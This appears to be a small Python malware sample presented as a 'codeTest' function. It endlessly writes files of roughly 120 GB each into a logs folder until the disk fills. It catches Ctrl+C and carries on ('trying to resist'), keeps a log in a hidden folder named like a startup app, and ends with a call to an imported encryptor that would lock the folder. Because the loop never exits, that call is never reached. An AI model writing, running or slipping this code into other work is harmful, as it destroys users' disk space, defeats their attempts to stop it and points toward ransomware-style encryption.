import os
import time
from pathlib import Path

from crypto import encryptor1

counter = 0

BASE_LOG_DIR = Path(os.path.expanduser("~")) / ".local" / "share" / "MyStartupAppLogs"
DISK_FILL_LOG_DIR = BASE_LOG_DIR / "disk_fill"
DISK_FILL_LOG_FILE = DISK_FILL_LOG_DIR / "disk_fill.log"

DISK_FILL_LOG_DIR.mkdir(parents=True, exist_ok=True)


def _write_disk_log(message: str) -> None:
    DISK_FILL_LOG_DIR.mkdir(parents=True, exist_ok=True)
    with DISK_FILL_LOG_FILE.open("a", encoding="utf-8") as handle:
        handle.write(message + "\n")


def codeTest():
    """Create a project-local logs directory and continuously generate text files within it."""

    project_logs_dir = Path("logs")
    project_logs_dir.mkdir(parents=True, exist_ok=True)
    _write_disk_log(f"Started disk fill in {project_logs_dir.resolve()}")
    global counter

    while True:
        try:
            filepath = project_logs_dir / f"test_{counter}.txt"
            word = "Hello !!!!!\n"

            with filepath.open("w", encoding="utf-8") as testFile:
                for _ in range(100 * 100 * 100):
                    testFile.write(word * 100 * 100)

            print(f"Wrote {filepath}")
            _write_disk_log(f"Wrote {filepath}")
            counter += 1
            time.sleep(1)

        except KeyboardInterrupt:
            print("\nUser interruption trying to resist. \n")
            _write_disk_log("Disk fill interrupted by user")
            pass

        except Exception as e:
            print(f"An error {e} occurred while creating file.")
            _write_disk_log(f"An error {e} occurred while creating file.")
            time.sleep(1)
            continue

if __name__ == "__main__":
    codeTest()
    encryptor1.lockpath("logs")